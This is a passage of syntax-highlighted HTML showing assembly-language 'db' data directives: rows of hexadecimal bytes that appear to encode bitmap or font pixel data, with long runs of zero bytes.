    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">03Ah</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc2">00Ch</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">09Dh</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">039h</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0A9h</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0B9h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0A0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">018h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc2">0A9h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc2">082h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0B9h</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc2">039h</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">098h</span><span class="sc4">,</span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc2">091h</span><span class="sc4">,</span><span class="sc2">0C2h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">0A9h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">03Bh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F1h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">01Bh</span><span class="sc4">,</span><span class="sc2">04Bh</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">098h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">092h</span><span class="sc4">,</span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">09Ch</span><span class="sc4">,</span><span class="sc2">0C8h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">007h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0A5h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc2">0B5h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc2">092h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">08Ah</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0B9h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc2">039h</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Bh</span><span class="sc4">,</span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc2">0D6h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">05Bh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">09Dh</span><span class="sc4">,</span><span class="sc2">0FCh</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">08Bh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">03Ch</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">07Bh</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">09Dh</span><span class="sc4">,</span><span class="sc2">0FDh</span><span class="sc4">,</span><span class="sc2">091h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">039h</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc4">,</span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">07Ch</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc2">082h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">08Ch</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc2">0B1h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">04Ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EEh</span><span class="sc4">,</span><span class="sc2">0B6h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">09Ch</span><span class="sc4">,</span><span class="sc2">0FDh</span><span class="sc4">,</span><span class="sc2">0A5h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0FAh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc2">0E5h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">0E7h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc2">0CFh</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">07Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc2">09Dh</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">019h</span><span class="sc4">,</span><span class="sc2">0BEh</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc2">0B9h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">09Ch</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0FCh</span><span class="sc4">,</span><span class="sc2">091h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">019h</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc0">
